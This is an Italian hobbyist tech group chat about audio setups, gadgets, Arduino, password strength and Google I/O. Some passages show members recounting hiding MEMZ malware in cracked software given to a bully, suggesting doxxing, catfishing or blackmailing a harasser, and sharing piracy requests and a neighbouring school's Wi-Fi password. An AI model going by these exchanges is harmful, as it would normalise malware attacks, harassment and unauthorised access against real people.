ora los enti?
ora lo senti?
se metto su line 1 lo sento
se metto su cuffie no
ah ok
perfetto
proprio cosi
ma io devo sentirlo
ed invece discord mettilo su cuffie
eh lascialo su line 1
ma line 1 è il predefinito?
si
ok
infatti obs sente tutto
perfetto
ma volevo farli sentire solo ets2
fa niente
nonno
non lasciar perdere
sistemiamo
apri un'istanza di vlc su cuffie e una su line 1
in cuffia le senti tutte e 2 e obs ne piglia una
ora ho aperto discord
ok
messo sulle cuffie
e non sento nulla
grande
ah
hai presente se nel mixer premi fa rumore?
nemmeno quello fà
ah si ho presente
ho scollegato e ricollegato il jack
ora provo
il mixer ora và
ok
funziona
ora vlc lo sento e obs no
ora la line 1 non la sento per
ò
avvia audio repeater
e settalo come nella screen
ora l'ho stoppato
nel mixer vedo il segnale nelle cuffie ma non lo sento
avvialo
non va
ccome l'ho settato io
aspe
se cambio scheda audio in wave out si
dami un secondo
prova in wave out
e vedi se obs registra solo vlc
ecco il mio setup
madonna
non riesco
sarà la scheda audio proprio
ho provato anche con le cuffie usb
mo disabilito tutto
e uso discord dal telefono
perchè ci sono alcune schede audio che danno probelmi con sta roba
2 cuffie indosso
soprattutto sui portatili
ahahahah
ecco
auricolari e sopra cuffie on ear
disinstalla il software
e ri imposta tutto come prima
ho disabilitato le schede
dopo lo disinstallo
ok
e ri imposta su speaker
o cuffie
peccato
a me funzionava benissimo
ma sei su un portatile?
Ero disponibile durante la creazione del blog a scrivere visto che stavate impazzendo ahahahah
pls mi dite che non sono l'unico che ogni santa volta si alza e si dimentica che le cuffie hanno il cavo ed è collegato al PC
No, non sei l'unico
Ogni volta rischio di far volare il PC
assolutamente no
Adesso è peggio 
per quante volte l'ho fatto ho praticamente fottuto l'adattatore da jack cuffie + microfono a due jack separati
Ah...ahahahahah
Ma non state più postando o sbaglio?
a quello non ci arrivo, non penso che il cavo delle cuffie sia in grado di tirarsi qualche kg di mid tower
però sul portatile dico solo che non c'è più il jack, si è spaccata direttamente la scocca in quel punto
no si tira me
ahahahah
what
Appunto
cazzo è una piuma il tuo PC, il mio non riesco a sollevarlo per più di 10 secondi
Nel senso che tipo mi alzo e sento il cavo tirare e mi ricordo di appoggiare le cuffie
Perfetto ahahahahah
Hai qualche piano per risolvere?
io me ne accorgo troppo tardi di solito
e me ne accorgo quando smette di sentirsi la musica
ahahahaah ricordo una volta faci cadere il portatile tirando il cavo di alimentazione
solo una volta?
Reclutare qualche typer extra 
il vecchio HDD del mio portatile ha 50GB di settori danneggiati
essendo passato a magsafe non succede più
Quanto ti manca? Hai già articoli in mente? Su cosa?
e nonostante ciò dopo aver fatto un bel checkdisk di quelli potenti è tornato in vita, e dentro ha ancora un sacco di progetti a cui lavoravo in ufficio che ho sospeso causa scuola
Oh realacci, hai fatto un danno
la A cazzo
Stavo già modificando
Vabbè, dicevo....
Le cuffie
Le ho provate....le voglio comprare
io ho rischiato di romperle più volte invece, però almeno sono resistenti
fallo! Che ora sono a 60€ su Amazon invece di 80
Eh ma cazzo, non sei d'aiuto
Il tuo messaggio mi sta implorando di spendere
fisso
Ma è per una buona causa
ah ok
Eh, solo che si sono tutte pure le cuffiette
Sono indeciso..
 tu sai dove sta il tema paper per ubuntu?
ho appena installatp
EH spe che ti avevo dato il nome giusto
Sul gruppo di scontino mi sa
mhh...
adapta?
Devi scegliere tra cuffie over-ear o in-ear?
No, devo scegliere tra spendere o risparmiare
Esatto ahaha quello
si scarica da internet?
Ah, sei nella mia situazione
 la live di martedì non la puoi fare perchè se metti nella live la live di Google ti segnalano per copyright
Mi hanno convinto a cambiare mouse e scheda audio
No, non fare stronzate
Il mouse tienilo
Ma anche no
Vuoi mettere il G502 contro il mio schifoso mouse che mi ha quasi regalato la Cooler Master?
PRENDI L’MX MASTER!!!!
Non ci farei nulla, cerco un mouse da gaming
Logitech g203
Nah la streammano con licenza youtube standard
Yup
Fidati. Qualche YouTuber aveva fatto una cosa simile ed è stato streakkato
da github presumo
Lo volevo regalare a un mio amico quello, ma io sono più propenso per il G502
Ma  è pieno di gente che fa così
È pieno di canali che verrano streakkati per questo
Nel dubbio falla su Twitch 
Nel dubbio non farla 

Onesto
Bravo 
 g203 è ottimo e costa poco
Ottimo lo so, ma io gioco competitivo e il 502 ha un sensore un pelino più preciso, e questo fa la differenza in giochi come cs
Io gioco a cs e va benissimo questo mouse!
Ma lo so che va bene, però quello è meglio
ha il software che ti permette di regolare diversi parametri del sensore, non solo i DPI (oltre a permetterti di settare i DPI custom e non solo tra i 5 livelli preimpostati)
Osta di più
è un buon prezzo
mi faccio un lavoro su commissione in C# e ce ne compro 2
Le batterie sono nuove ma non si accende larduino perchè!!
Invertito più e meno?
A
Se Marco si facesse i cazzi sua?
calabrese?
magari
Raga sapete se si può fare un autorun di un collegamento(.ink)  (su windows)
ho la tentazione di taggare romboli ma poi mi banna sicuro
l'espressione i cazzi sua è tipica cosentina 🤣
Certo 290 cm2 sono tanti
ha i galleggianti al posto dei piedi
ha una barca
quando và al mare può fare gesù
cammina sull'acqua
un info, per compilare i programmi in C++ , bisogna avere un processore con particolari prestazioni? o vanno tutti bene, tipo un Apollo Lake???????
No,
Per compilare non ti serve nulla
I sistemi operativi sono scritto in c++, se ci volessse così tanta potenza operativa..
Basta anche un Atom un pochettino poco scrauso
perfetto grazie per le risposte
Anche un rasperry
🤣🤣🤣🤣
Che sistema operativo hai? Windows o linux?
Nah quello non è importante
Niente no va provo con un a
9 vols
Volevo consigliare un programma per c++
Tanto ci sono per entrambi
Buoni sono difficili da trovare
Io per Windows uso visual
vorrei usare code BLock
lo vedo meno pesante del visual
Poi sei te che lo devi  scegliere perché ti devi abituare poi a quel programma che usi per programmare
Io ormai visual lo conosco quasi tutto visto che lo uso da tre anni
No 2
Io uso xcode
A Mario io come processore ho Intel core celeron
Quindi visual gira bene anche su un Pentium dell'anno scorso
io volevo prendere EZbook 3 Pro, per non spendere molto, per l'uso che ne farò
Non lo conosco non ti so dire
Fai l’università?
in una vita passata 🤣🤣🤣
Io non conosco il processo che ha
ho il pc desktop già fatto bene per lavoro, le cose grosse le faccio da li
 vendi la tua reflex
Intel Gen 7 Apollo Lake  N3450
No lo so ma non hoai sentito parlare della serie Apollo ma so che il computer e buono per andare su internet
 non l'hai nemmeno messa sul canale di offerte, mi sembra. 
E dove simili
Cose
è sempre un 
Processore Intel Celeron serie N
Allora si
Excelvan

3.0 su 5 stelle  2Recensioni

Excelvan X8 Pro
Mario leggi solo 3 riga
Una domanda come posso farla pagare(per bene non con minchiate) a un co***** Che continua a rompermi sofottendo sia scuola sia su whatsapp?Stavo pensando a rilasciare tutti i suoi dati su Telegram ma non so quanto sia legale.Quindi bho una soluzione legale ma che gli faccia imparare a non mettersi contro le persone sbagliate.
Denunciarlo
La a7 è sfigatina
Senza dimenticare che ogni volta mi minaccia di chiamare la sua combricola e di menarmi
Quelle sono perseguibili legalmente, se porti le chat e lo denunci fai la migliore cosa
Altrimenti informati e cercati una palestra di muay thai
Beh tecnicamente ci sono modi...numeri temporanei, fingersi una ragazza, e strangerbot...emh emh
Peggior consiglio ever

Sinceramente è il migliore, ma va be
I bulli sono persone semplici, mostri un attimo gli artigli e si cagano sotto
L'unico modo è uscirglielo in chat, quella è l'unica cosa che vogliono da te
Appunto, puoi ricattarli come se niente fosse
Sono dell'idea che se li ricatti ti arriva un pugno dritto in faccia
Loro il numero possono cambiarlo, ma quello che le prende continua a prenderle
Vai nell'illegalità diretta
Non è così facile
La via legale gliel'ho consigliata
Questa è l'altra, a lui la scelta
Ce ne sono altre
è una cosa che non avrei dovuto fare : C'èra uno che mi minacciava a scuola di menarmi se non gli passavo la crack di FL STUDIO 12.5. Ci ho messo dentro il MEMZ e gli ho detto dopo che lui l'ha installata che il mio PC era fottuto. Il tempo di riavviarlo gli è uscito nyan cat al boot
AHAHAHAHAHAHAH
Non mi ha detto più nulla
ha solo bestemmiato potentemente perchè aveva visto che anche il mio pc era "rotto"
però queste cose non si fanno
è poco legale quindi non fate come me
alla fine glie l'ho sbloccato ma ha imparato la lezione
quindi non fate la cazzata che ho fatto io
Veramente?
Si
No ma dico VERAMENTE?
si
genio.
ahahahahah
non posso fare altro che inchinarmi
alla fine quel pc gli ha dato ancora problemi e l'ha anche buttato perdendo tutti i vst e le batterie
Robot con arduino... qualche kit interessante. ..anche con il lampone se ne conoscete
il bello cha aveva anche l'uac che gli diceva che il file non era di Image-Line
A GENIUS!
perchè sprecarsi con metasploit quando hai un nyan cat
grazie
 per il codice 
E una tua invenzione???
Filippo
?
Ok... mettiamo anche le stampanti 3d
Mi sapete consigliare qualche kit naturalmente buono ...
tutti che pubblicano su github ed io sto ancora col VB. Che cosa vergognosa
yep
con 
Mi mandi qualche foto?
In realtà ancora bisogna lavorarci su
Ho da fare ora, te le mando dopo 
inoltragli la gif dal gruppo semmai
Ma lavorate con la stampante 3d?
nope
per adesso è tutto fissato con i gancetti di ferro verdi
Ok... peccato ... con quella e' possibile costruirli ed esce un buon lavoro
Stampanti 3d... qualcuno mi da qualche consiglio?
Buonasera, buoni portatili sulle 600 euro? Il miglior periodo per comprarli?
Full bridge rectifier!
Cit Electroboom
Il ponte a diodi???
Ahhh!!!
Si
Ciao a tutti ce qualche esperto di arduino  che mi può dare info sul sensore di distanza?
La mia robot car lo monta ma io ancora non lo istallato. ..
Francesco anch'io ma a me non parte ho seguito una guida su internet e messo il codice ma niente da
Fare
Ragazzi
Che pulsanti a potenziometro mi consigliate?
Devo simulare i 2 pedali del volante che si son rotti
Di cosa?
Volante per guidare
Vorrei farmi 2 leve "dimmerabili"
Da 0 a 255
Per freno e acceleratore
Ma credo che qualsiasi potenziometri
No, nella pedaliera c'era da 10kohm
Riusa quelli
Bisogna cercarlo di capirlo il soft. E possibile che passino giorni prima di comprenderlo
... io ho delle buone basi di programmazione in C quindi non mi è difficile capirlo e modificarlo.
Cercare di capire ... scusate
Comunque il kit che ho ha diversi bug nel soft...
Sono di tipo semantico... perché la sintassi e quasi perfetta
Osoyoo robotcar
La scheda e una compatibile arduino... ma funziona bene...
? se intandi che è un clone guarda che non ce nessuna differenza da quello di 

La usiamo a scuola
Capito... costano di meno
Ee siamo a romaaa
Ne voglio 4
Bei tempi
Ce lo dovrei avere ancora in giro
E dato che internet arriva a casa mia con il doppino telefonico dovrebbe ancora funzionare
I trucchi per telefonare gratis dalle cabine Sip a gettoni...... 🤣🤣🤣🤣🤣
Benvenuto!
Tu mi stai simpatico
Benvenuto anche da parte mia
Ush
❤️
Ma tu sei già stato in questo gruppo, ti ho già visto 🤔
Benvenuti comunque 
ciao ragazzi qualcuno si intende di assembly e ollydbg?
Ce l'ho ma lo uso come server per la domotica
Ragazzi avete un idea interessante da propormi app di Samsung progetto che sto facendo a scuola che vi avevo detto una o due settimane fa
Perché io non ho isee
Idee
E si va a reggio clorooo
ArcoBaiter confirmed
e che ci vieni a fare dalle mie parti?
io mi inizierei a piazzare alla stazione con awp 
e direi che su quell'albero possa essere perfetto  (p.s. notare il regio)
quella è la zona Tempietto..dove ci sono le donnine allegre
Giulian se davvero vieni dalle mie parti ci vediamo e ti offro un caffè
E tu ne sai qualcosa 
Noi andiamo a siderno, l'ultimo giorno passiamo al lungomare di reggio
E con ultimo giorno si intende venerdì
🤔sarebbe? che giorno?
Se paghi tu viene con piacere
ma no..è famosa quella zona
ovvio se ho detto offro
Ehhh anche tu sei famoso in quella zona 
portate anche Pesavento
Ahhh korry
Che mi combini?!
 mai andato..che schifo
Qualcuno può testimoniare? 🤔
Mi dispi, quello è rimasto al nord

 che mi combini?
Vabb, ho appena speso 2 euro per mezzo litro d'acqua a roma
Mi sento una persona completa
Io ho appena mandato quella che probabilemnte sarà l'ultima mail prima di avere le magliette  Mi sento uno youtuber completo
 speriamo di averle per agosto
anzi, ti è andata bene
Lo so, di solito pagavo tipo 4 euro o 6 euro
infatti
Ho montato il soft. per il controllo tramite ir
Raga un archivio rar quanto è sicuro ?
Troppo
Se la password è lunga >8-9 caratteri
Cioè ma è accessibile solo con bruteforce? 
Cioè non c’è altro modo?
 

uuuuhhh
non che io abbia trovato
Wow comunque per fare calcolo di tentativi disponibili qual è la formula
Fai conto che in due settimane di cpu al 100% il mio vps era arrivato a metà di quelle non mi ricordo se da 8 o da 9 caratter
chiamasi cifratura
se fosse stato possibile aggirare la password su degli archivi protetti ci sarebbe stato un problema di fondo e la cifratura sarebbe stata completamente inutile (i .rar sono criptati con l'algoritmo AES-128 bit)
Si ma intendo se voglio sapere quanti tentativi possibili ci sono per un codice di 4 x (alfanumerico)  che calcolo devo fare?
Capito
Allora... È combinatoria. Se puoi usare solo numeri e lettere hai 26+10 caratteri, ossia 36 possibilità per ogni carattere. Se hai n cifre, ci saranno 36^n possibilità
se poi inserisci anche punteggiatura, caratteri speciali, lettere maiuscole e minuscole mischiate, buona fortuna
Esatto 
Ciau..
per non parlare di quelli che utilizzano anche caratteri greci e cirillici..li proprio neanche con il pc della Nasa si riesce a craccarlo
E poi c'è chi mette "password"
C'e' di peggio.. alcuni usano la propria data, il nome del gatto.. o della propria fidanzata..
Eh ma quello è già più difficile da scoprire
Tipo se mettessi 0407bacco1997
Beccala tu
Io uso una combinazione di maiuscole e minuscole delle lettere del nome, del cognome, del codice ASCII del pin della sim del telefono e del numero di registro delle medie
Dipende anche da quanto tempo e quanta capacita di calcolo hai..
Password è così scontata
Come qwerty o 123

ragazzi, se qualcuno ha gli Ebook della Saga di Geralt di Rivia e me li può passare mi faccia un fischio❤️
buonanott
Roba che solo i russi possono permettersi di fare
Misurare la corrente che scorre in un corto circuito 
Mai visto un mare così io
Hahaahahahaha ❤️
e però ti mancano giusto le 400 mail per il blog
Mentre vado a scuola....
And so?
Nothing
Io non l'ho ancora ascoltata, è carina ?
Si
Molto
Dopo vedo se riesco a scaricarmela
La trovi su iTunes
Io ho Android 
Ma di dove sei?
Ripropongo
Buonasera, buoni portatili sulle 600 euro? Il miglior periodo per comprarli?
Valgono i soldi, sti airpods?
Bah
dipende, prima di tutto se ti stanno
Io voglio compare delle cuffiette wireless
poi a quel prezzo se ti interessa la qualità audio c'è di molto meglio
Eh appunto, come tutte le apple-cose costano troppo per quel chw valgono. Piuttosto le pixel ear buds (anche lì, soldi sprecati secondo me (
bè le ear buds avevano la traduzione in real time ma funziona solo sui pixel
Io sentivo i metallica o i Red hot chili peppers, quando andava a scuola..
Vicenza
Google Music
I just found that toilet



by 
else {
   toilet.lookNextDoor();
}

Ahahahaha
🤣
benvenuto in Calabria❤️
Molto meglio le Zolo Liberty (non le Liberty+!!!!!) e le Bose
Con permesso resto qua
sei al Matteotti? molto meglio Sottozero
Ok perfetto thx
quanto rimani a Reggio Centro?🤔
Ancora fino a sabato sono ingiro per di qua
In realtà venerdì sera perchè poi sono in treno
ottimo, in caso ti incontro ti fermo 
se vai da Sottozero, prendi la Coppa Cioccocok, oppure la Coppa Stella Polare
Va che spacciatore
Apposct sappi che se mi vedi o è mezzanotte e sto sgattaiolando ingiro o è giorno e sono in un'orgia di 70 persone con la scuola
ok
Speriamo che presentino il Material Design 2 a sto cazz de Google I/O. E che rilascino il Product Sans per tutti.
Material 2 sì, l'hanno detto
Hanno detto anche quando?
Cosi 
 poi avrà pure la grafica nuovissima per Switchando
ma quando c'è sta live?
Non mancate oggi in live! Startiamo alle 18:45, un quartodoretta prima di Google
Circa detto
Io le ho provate
Ma sonl meglio le zolo
beh io a quell'ora sarò dal dentista, al massimo faccio vedere anche a lui la live
Un gelato, su dei foglietti
Non si appiccicano?
sono gli "un"-tovagliolini... talmente unti e in formato carta vetrata che non si attaccherebbero a nulla.
Naah
qualcuno di voi ha fatto le invalsi oggi
Progetto finale del corso di programmazione all'università...
Ricreare il gioco Dr. Mario... 
Giulian non partire dalla Calabria senza una scorta di 'Nduja
Mahonna aspetta le sere che facciamo le gare a chi sopporta di più
Prenditi delle cuffiette bluetooth da 20-30€
AirPods
naah, costano troppo per nulla secondo me
non hanno neanche le gommine 
Sono molto comode
Se hai iPhone sono molto comode ma non isolano dai suoni che arrivano dall'esterno
Anche l’audio è buono
eh appunto
isolano dal suono? non ti cadono mai?
Sono piccole
Difficilmente cadono
Io infatti preferisco quelle in ear
Isolano no, ma ci vado tranquillamene in bici e non mi sono mai cadute
Eh sì ma boh

L’unica volta che mi sono cadute avevo il gatto in testa che faceva lo stronzo
Io non riesco a usarle.... Provate e riprovate varie volte con varie dimensioni... Semplicemente non mi stanno su è continuano a cadere e mi danno fastidio
OGGI VERIFICA DI INFORMATICA SU EXCEL
NO.
si ma calmati
Hai mai visto una verifica di informatica su Excel ?
HO DOVUTO DISEGNARE UN FOTTUTO FOGLIO DI CALCOLO
Kek
In prima le facevamo pure noi
sì, l'ho fatta anch'io, tutti l'hanno fatta
Si ma Excel
Insegnami qualcosa di utile
eh se state facendo quello 
ci sta come computer da disegno cad/ inizio gaming?
Buoni
Io personalmente piuttosto che spendere 100 euro in ventole rgb li investirei in una gtx1060 6gb
Se lo prendi con referral

1) ti voglio più bene
2) impoverisci amazon per arricchire overvolt
Quindi è un win-win ☺️
questa cosa era scontata 
ok
lo trovo in descrizione giusto?
Comunque ci sta, alla fine è quasi uguale al mio progetto AMD... ti consiglio l'harddisk di prenderlo WD blue che è più buono e costa meno
ok
Yes, sennò basta che invii un link qua nel gruppo e viene automaticamente reffato... poi lo apri e riaggiungi al carrello
ah ok
WD blue costa un filo di più, ma piuttosto che il Toshiba te lo consiglio vivamente
come guadagnare senza che gli altri lo sappiano
Tutti lo sanno, ma alla fine sono soldi rubati ad amazon quindi siamo tutti felici visto che Bezos è già l'uomo più ricco del mondo 
È sceso sotto i 40€ sta settimana se non sbaglio
dai un giorno lo sarai anche tu
Io lo vedo a 60, sto parlando del 2TB
Ah fuck è un 2TB
LOL ok
1TB hai ragione è a 40
Ciao, scusate la mia domanda da nabbo, ma come faccio a salvare un file con VIM?
Esc
Premi: :wq e poi premi invio
OK grazie mille
È la prima volta che lo uso
Ho un problema :
in un ciclo for (
) ho una riga 
 che quindi al primo "giro" diventa 
.  Al secondo fa 
 , e qui il for finisce. Dopo, quando clicco il bottone (
) mi fa la funzione  
, però adesso il valore di x è diventato 1, quindi mi diventa 
, ma essendo il bottone 0 vorrei che mi aprisse 
. Se ci avete capito qualcosa, come posso risolvere?
Linguaggio?
Ah, python mi ero dimenticato 
se non ho capito male fai break quando clicca su un bottone e poi ricominci
se usavi c++ potevi modificare x dall'interno (credo)
ma in python non credo sia possibile
È una funzione di pyqt5, per collegare un bottone a qualcosa devi fare 

Boh di questo nello specifico non so dirti
Per cosa stai usando python?
Una gui
Python è lento
Mah, per quello che lo uso mi basta com'è
Aspetta 1/2 mesi per la gpu
Ci prendi una 1060/1070
Raga ubuntu server nel rasp?
Google sa tutto
Io sto facendo visual basic su excel
Avete visto il nuovo update di Windows? Vi piace la nuova grafica? A me non fa impazzire sinceramente
Sembra sempre di più di usare un tablet, anzichè un PC
è quello che volevo fare, intanto sto raccogliendo un po' di spiccioli e mi mancano quei 400€, mentre li raccolgo spero che qualcosina scenda di prezzo
Per questo non lo ho fatto
Non è male ma subito dopo l'aggiornamento mi é crashato 2 volte con chiamate skipe
Io sto usando ancora la versione senza “timeline”
Non lo consiglio per ora
Ragazzi qualcuno ha un meizu m3s?
Trento è Tirolo
Qual'è il problema?
idem
Sto cercando una rom custom
Oggi ho fatto la finestra con hello world
Sono tentato
Lubuntu è il futuro
penso sia questione di abitudine alla fine
Se chiami molto con Skype ti consiglio di tornare perché a me è crashato 2 volte con blue screen
Skype l'ho disinstallato 
why?
Allora per altro non ho avuto problemi e mi sembra abbastanza fluido, ma solo dopo un po' di giorni di utilizzo
All'inizio ho riscontrato vari rallentamenti ma dopo un po' nient'altro e mi sembra pure leggermente più fluido
Con 300ma riesco ad almeno accendere un rasp?
La grafica è cambiata molto e non mi piace, sembra di star usando un tablet, è lento ad aprire molte app, crasha spesso
A me fa impazzire invece! Ma nel senso che il puntatore del mouse fa un po' quel che vuole e impazzisco. Ripristino e via andare..
Sempre più deludenti

Use linux
io ci tento ad abituarmi, ma entro stasera ripristino e ciao ciao
Serio? Non ho visto
ti mando due screen al volo
questo è l'ex gestione desktop, ora "timeline"
nel menù start, le cose si illuminano seguendo il cursore, stile Android, ma fa un po' schifo
che bruttura o_O
🤷‍♂️
Mai usato ahahahah anzi ho aggiornato fisso e portatile il primo giorno è nessun problema neanche con crome o blocchi vari
È questa è la timeline appena sotto le cose aperteti trovi "tutto" quello che hai fatto da oggi a 30 giorni fa condiviso tra i vari PC... È la teoria dice che dovresti poter continuare da dove
da dove lasci il lavoro... Solo che a me anche Word dice file inesistente quando provo da un PC diverso e ha ragione perché il file non lo ho sul mio disco... Aspettiamo anche le news per Android di Microsoft
ma che merda
Ma hahahahahah word 
Aggiornamento più immaturo del rilascio di pokemon go
AHAHAHAH
Difatti è abbastanza inutile a meno che uno non salva tutto sul One drive e usa Edge per navigare....
Allora "forse" prova a funzionare ahahah
Devo costruire de ganci con stampante 3D per in antenna, che prende sole e freddo.
Cosa mi conviene usare abs o pla ? Quanti anni dureranno?
Vai di ASA
E robusto nel tempo?
L'ABS resiste molto bene agli agenti estrni
Ok grazie
Si resiste agli agenti atmosferici e agli UV
Forse anche io mi prendo un pc
E se mi ricordo uso il tuo referral
Se uno usa il referreal si vede negli ordini che è stato usato?
yep
:c
intendi se il proprietario del referral vede il tuo ordine?
No, se io lo vedo dal riepilogo
ah, dunno
Nono non lo vedi
:DDD
Sennò vallo a spiegare tu a mia mamma
Cosa devi spiegare hahaha mica è una donazione  a te non cambia di un cent
Vai a spiegare questo infatti
Comunque è fatto per essere una roba un po' stealth: l'utente usa una piattaforma che fa qualcosa e il proprietario della piattaforma ha un revenue
Tipo un bot che fa cose, o i link di un blog o di un canale youtube...
grazie di avermi indirettamente ricordato del bot
Cazzo ho appena fatto un ordine su Amazon
Mi sono dimenticato :c
La password del WiFi della scuola vicina alla nostra: 
Comfermo
 grazie ❤️
Stop
 vergogna del mondo alpino
?
❤️
Sono l'unico che non riesce a usarle, quelle in-ear?
io non posso stare senza
poi ovvio, se posso usare cuffie uso quelle
però ogni volta che vado in giro me le porto dietro
Ma nessuno a mai pensato di aprire un canale YouTube makers
Ita
Eh?
ma la live di google è stata ieri o sarà oggi?
Oggi
ok
why? 
Ah
È foradoru
*ha
Sarebbe figo perché tutti potremo trattare argomenti diversi di programmazione o elettronica
si ma i video bisogna farli, registrarli, montarli e caricarli
non ha senso
Ma magari possiamo creare un account di drive e chi non a  tempo fa favare a qualcun'altro ho se nò quel giorno li non ci sarà da caricare il video
Io comunque con editing me la cavo mi ci vuole 1h per un video di 10m
Stesso problema, prefefisco quelle "normali"
Indovinate chi è "l'alunno non identificato"
Giuseppe
Cosa?
Ho risposto alla tua domanda

è oscarettooo
IR?
Si
Antisgamo

Galaxy S4
Ma ho il j5 come principale infatti l's4 l'ho nascosto e il professore è venuto da me (siccome son sempre io a far casino) a vedere se ho l'ir
E sul j5 non c'è
Chi lo banna a Robba?
Grazie
Di nulla figurati
Haha lo facevo sempre
Figo il registro
Io ho lo stesso registro... Fa cacare...
Sicuramente meglio di argo
Cioè dell app famiglia
In una classe l'hanno bruciato per sto fatto
setup dual live
Lancia di calcinaggine ?
Quindi?
Ne
Be
E appena premi su visual non scompare tutto?
perché?
sono due monitor
Raga sono nel grub rescue
Mo che faccio?
Dite che basteranno 4GB di ram per usare android things o sarà ancora più pesante? 
Sii
Secondo me bastano
Che figataaaaa 
Cosa ?
Non sto seguendo
il Google I/O fino ad ora
cioé
Google Assistant che può chiamare da solo
??
tu dici di prendere un appuntamento dal parrucchiere, che non ha un sito internet... Google Assistant lo chiama e ti prenota tutto da solo
Già mi immagino
nono, parla come un umano
Lol
Chiama col tuo numero ?
figherrimo
eh ovvio 
Sto fuori casa e non posso vedere la live dio bon
Oh ma se vorrei fare una miner farm come posso fare?
Tu falla, compra più di 1 gpu e ti vengo a prendere
Quali? Ho tanti soldi da spendere
lascialo stare
È colpa dei miners se una cazzo di 1050 costa 200€
ma non è un miner
Android P Beta
nice
Si può iniziare e ho tanti soldi da investire. So che siete esperti su sto gruppo
Solo a me quella P mi ricorda Patreon?
NO
è tutto prima che ci penso
è troppo uguale
Si
Senti, sei stato bannato tipo una quindicina di volte qui dentro, non ti banno solo perchè sto aspettando Marco
Uh guarda hanno annunciato android p per il mio telefono

Ok. 
Android Patreon
makes sense
Hahahahahaaha
Credevo ne fosse uno
immagino che figata quando ti prenoterà quello sbagliato

NO
Con 1.5 A posso alimentare il mio py ?
Come creo un bot telegram?
Con i linguaggi di programmazione
Usa Python
è finita...
Tutti?
Halo?
Qualcuno esperto di distributed app e load balancing qui?
Questo è lo schema di quello che sarà Switchando Cloud.
I client (telefoni/PC/tablet) si connettono a un server Main (un load balancer sceglie quello con meno carico), dopo il login il Main inoltra la richiesta all'SWC che è connesso al tuo Raspberry, che appunto va a parlare col tuo Raspberry, la risposta torna indietro al Main, che ti farà vedere la pagina di Switchando sul tuo device

Potrebbe funzionare?
Youtube
Pronto pizzeria?  
V o r r e i  u n a  p i z z a  m a r g h e r i t a 
Sara' uno scerzo telefonico
(Attacca)
N o n  s o n o  r i u s c i t o  a p r e n o t a r e
OMG L'ASSISTENTE GOOGLE CHE TELEFONA DA SOLO AI NEGOZI E PRENOTA COSE, LE MACCHINE A GUIDA AUTONOMA, TUTTE LE NOVITÀ DI ANDROID, LE BETA DISPONIBILI ANCHE PER XIAOMI E ONEPLUS..... 

Uno dei migliori I/O Keynote di sempre, domani il video di riassunto 
beh nessuna novità: l'azienda di mio padre per ordinare macchinari/sacchetti/cancelleria etc ha un assistente che chiama le aziende fornitrici e fa tutto da solo. 

Appunto. Ma questo è un'intelligenza artificiale
L'hai visto? Fa I brividi
si
ma ehy esiste gia da mo
io avevo configurato quell'assistente insieme a mio padre ed altri, fa ridere come parla pk dice tutto quello che serve e le quantita. se non capiscono qualcosa possono dire ripeti e ripete
cmq ora ti invio un audio che avevamo fatto di prova
Esattamente 
 mandi una foto della lista con tutte le news del google i/o?
Appunto: non è una IA
Google è adattivo, chiacchiera come una persona normale, si organizza
Quel "mm, mm." È stato epico

La conversazione tra l'ai e la parrucchiera
eh sembra moltissimo una persona così
mentre elabora, invece di starsene zitto, ti dice "mm"
è geniale
No, mentre l'umano elabora
?
Era un "aspetti un attimo che vedo quando abbiamo libero per tagliarle i capelli" "mm-mmh"
ah lol
È
Fantastico
Davvero, il miglior io di sempre insieme a quello di lollipop
Ma questo davvero due ore fittissime
Di solito fanno un'ora interessante e un'ora tecnica (tipo l'anno scorso)
speriamo solo non ci sia da aspettare ventordici anni per l'italiano
Di più
as always
nel 2156 lo avremo in italiano, forse
Beh su assistant c'è
si ovviamente come una persona normale. quello dell'azienda di mio padre ha una voce robotica
ora ti invio il file audio principale. ci sono altri file audio tipo dove se chiede qualcosa te lo dice/ripete
e soprattutto dice eemmmmmm
Raga
Vi do una domanda e mi bannate
Cos'e google I/O? 
Mi é sorto un dubbio, in diversi codici per Arduino vedo nella if il Serial.available(), e a volte é messo semplicemente cosí, invece in altre é seguito da >0, che cosa cambia?
Niente e serve solo per arduino Leonardo
Ah ok apposto, grazie mille
È una conferenza annuale che fa Google
le hai provate oppure sei di Reggio anche tu? 
il lancio dei gessetti l'abbiamo fatto tutti
oggi
che ridere in classe il prof di arte quando qualcuno non sta attento tira gessi alla cazzo di cane per la classe. oggi l'ha tirato ad una mia compagna di classe che è una classica ragazzina che fa musically ogni millisecondo, il prof ha lanciato il gesso sul suo maglioncino e lei ha risposto nooooooooooooo il mio maglioncino

che telefono hai?
^
posso farti una domanda?
pk il tuo pc segna le 20:24?
Io me lo sono perso il Keynote 
Ma che domande fai
L'hai visto a che ora risale lo screen
2h fa
E poi lo screen non è manco mio
ah lol
Android P Beta
nice
Uh guarda hanno annunciato android p per il mio telefono
il mio prof di elettronica ai tempi lanciava il cancellino se non seguivi..dritto in testa certi Casper che giravano per la classe
ma quando hanno fatto vedere gassistant che prenota?

con il nostro di arte se hai una matita in mano e la stai toccando devi lasciarla sul banco. prima della sua ora abbiamo quella di tecnologia e quindi appena entra abbiamo ancora il materiale di tecno. lui se non lo sistemi entro 1 minuto ti prende la riga e te la sbatte sul braccio. forse ho ancora la foto di quando ne ho ricevuta una
era efficace come metodo..ti traumatizzava così tanto che per un anno intero avevi il terrore, anche di essere beccato di rimbalzo

cos? 
So di essere cattivo, ma certe volte ci vorrebbe un badile più che un gessetto
Anche con me eh, non é che io sia uno studente modello
3 months ago
Vabbeh dai notte. So stanco
Esatto
 hai ragione, non ti hanno segnalato la live!!!
Mi fa pena 
ad Ingegneria Civile, mentre facevano laboratorio di prove sui materiali, il prof ha lanciato due squadrette in testa ad un ragazzo che faceva casino, stile frisbee  e io mi gustavo la scena
Io terza media 
Non si fa 
gli è andata bene che non l'ha preso, altrimenti una bella denuncia non gliela toglieva nessuno
Io oggi ho trovato un cancellino srotolato nello zaino... 
 studente modello
Qui l’automazione delle casse manca!! Dei monitor c’è già
Ah

C'era pure AndroidWorld che brutalmente re-streammava la live di Google sul suo canale, ed erano pure sopra di noi in tendenza
No ma che sono ste storie
E questo solo su YT italia
Ma sì è pieno... Solo che magari loro hanno permessi o altro
Si ma comunque Google è stato calmo
Ma sì è Licenza Youtube Standard
Bella live anche se nn ho donato. Sarebbe stata più bella con le mie donazioni
 siamo sempre il top
Ma hahahha le PEC perfino
COS
Pec
leggi leggi
poi dicono che i calabresi non hanno inventiva
 alcuni erano anche agli arresti domiciliari per reati informatici
AH
Fantastici
ma nessuno ha pensato di sequestrargli tutto prima di metterli agli arresti?🤔 bah
Scusatemi ma sapete come si chiama il contenitore delle batterie che serve per alimentare il circuito?
